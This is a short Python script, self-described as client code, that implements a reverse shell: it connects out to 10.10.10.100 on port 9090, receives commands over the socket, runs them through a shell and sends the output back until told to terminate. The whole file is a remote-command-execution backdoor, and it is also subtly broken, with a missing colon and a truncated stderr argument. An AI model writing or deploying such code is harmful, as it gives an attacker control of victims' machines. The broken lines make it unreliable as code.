#This is code for client

import socket #For build TCP Connections
import subprocess #TO start a shell in the system

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.10.100', 9090))

    while True:
        command = s.recv(1024)

        if 'terminate' in command
            s.close() #close socket
            break

        else:

            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stde)
            s.send( CMD.stdout.read() )
            s.send( CMD.stderr.read() )

def main():
    connect()
main()
